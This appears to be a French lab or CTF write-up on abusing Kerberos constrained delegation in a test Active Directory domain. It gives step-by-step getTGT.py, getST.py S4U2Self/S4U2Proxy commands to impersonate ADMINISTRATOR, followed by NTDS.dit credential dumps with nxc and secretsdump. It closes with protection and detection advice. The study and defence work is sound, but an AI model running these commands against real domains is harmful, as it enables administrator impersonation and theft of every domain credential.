## Contexte

La **délégation contrainte Kerberos** (_Constrained Delegation_) permet à un compte (machine ou service) de s'authentifier **au nom d'un utilisateur quelconque** auprès de services spécifiques définis dans l'attribut LDAP `msDS-AllowedToDelegateTo`.

Une faille dans l'implémentation Microsoft permet de modifier le champ `sname` (nom du service) du ticket obtenu, car celui-ci **n'est pas protégé cryptographiquement**. Cela permet d'accéder à n'importe quel service sur la machine cible, même si un seul est déclaré dans la délégation.

---

## Environnement de la mission

| Élément                     | Valeur                        |
| --------------------------- | ----------------------------- |
| Domaine                     | `IMPERIUM.LOCAL`              |
| Machine source (délégation) | `GEIDIPRIME$`                 |
| Machine cible               | `ARRAKIS.IMPERIUM.LOCAL`      |
| DC IP                       | `10.2.62.87`                  |
| SPN autorisé                | `cifs/arrakis.imperium.local` |
| Compte usurpé               | `ADMINISTRATOR`               |

## Chaîne d'attaque

```
GEIDIPRIME$ (hash NTLM)
    │
    ▼
[1] getTGT.py → TGT forwardable pour GEIDIPRIME$
    │
    ▼
[2] getST.py S4U2Self → ticket au nom d'ADMINISTRATOR
    │
    ▼
[3] getST.py S4U2Proxy → ST vers cifs/arrakis.imperium.local
    │
    ▼
[4] nxc smb --use-kcache --ntds → dump NTDS.dit
```

---

## Exploitation pas à pas

### Étape 1 — Reconnaissance du SPN exact

> [!important] Le SPN passé à `-spn` doit correspondre **caractère pour caractère** à la valeur dans `msDS-AllowedToDelegateTo`. Une majuscule ou un FQDN manquant provoque un `KDC_ERR_BADOPTION`.

```bash
nxc ldap 10.2.62.87 -u 'GEIDIPRIME$' -H $NT_HASH --query "(sAMAccountName=GEIDIPRIME$)" "msds-AllowedToDelegateTo"
```

**Résultat obtenu :**

```
msDS-AllowedToDelegateTo cifs/arrakis.imperium.local/imperium.local
                         cifs/arrakis.imperium.local
                         cifs/ARRAKIS
                         cifs/arrakis.imperium.local/IMPERIUM
                         cifs/ARRAKIS/IMPERIUM
```

→ SPN à utiliser : `cifs/arrakis.imperium.local`

---

### Étape 2 — Obtenir un TGT forwardable pour GEIDIPRIME$

```bash
getTGT.py -hashes :$NT_HASH 'IMPERIUM/GEIDIPRIME$' -dc-ip 10.2.62.87

export KRB5CCNAME='GEIDIPRIME$.ccache'
```

> [!note] Sans cette étape, `getST.py` avec `-hashes` directement retourne : `[Errno 2] No such file or directory: 'GEIDIPRIME$.ccache'`

---

### Étape 3 — Obtenir un Service Ticket au nom d'ADMINISTRATOR

```bash
getST.py -spn 'cifs/arrakis.imperium.local' -impersonate 'ADMINISTRATOR' -k -no-pass 'IMPERIUM/GEIDIPRIME$' -dc-ip 10.2.62.87
```

**Sortie attendue :**

```
[*] Impersonating ADMINISTRATOR
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in ADMINISTRATOR@cifs_arrakis.imperium.local@IMPERIUM.LOCAL.ccache
```

---

### Étape 4 — Dump du NTDS via le ticket Kerberos

```bash
export KRB5CCNAME='ADMINISTRATOR@cifs_arrakis.imperium.local@IMPERIUM.LOCAL.ccache'

nxc smb ARRAKIS.IMPERIUM.LOCAL -u 'ADMINISTRATOR' -k --use-kcache --ntds

secretsdump.py -k ARRAKIS.IMPERIUM.LOCAL -no-pass
```

---
## Mécanisme technique

### S4U2Self

`GEIDIPRIME$` demande un ticket **pour lui-même** en se faisant passer pour `ADMINISTRATOR`. Ce ticket prouve que l'utilisateur s'est "authentifié" auprès du service.

### S4U2Proxy

`GEIDIPRIME$` utilise le ticket S4U2Self pour obtenir un ticket de service (_ST_) vers `cifs/arrakis.imperium.local` au nom d'`ADMINISTRATOR`.

### Modification du sname

Le champ `sname` du ticket n'est pas protégé cryptographiquement. Il est donc possible de le remplacer par n'importe quel service (`ldap`, `host`, `http`…) sur la même machine cible, permettant une compromission complète indépendamment du service déclaré dans la délégation.

---

## Protections / Détection

|Protection|Efficacité|
|---|---|
|Ajouter `ADMINISTRATOR` au groupe _Protected Users_|✅ Bloque l'usurpation|
|Désactiver la délégation sur les comptes sensibles|✅ Bloque S4U2Self|
|Activer le monitoring des événements `4769` (ST request)|🔍 Détection|
|Surveiller les requêtes S4U2Proxy inhabituelles sur les DCs|🔍 Détection|

---

## Références

- [Impacket — getST.py](https://github.com/fortra/impacket)
- [HackTricks — Constrained Delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation)
- [Microsoft — S4U Kerberos Extensions](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu)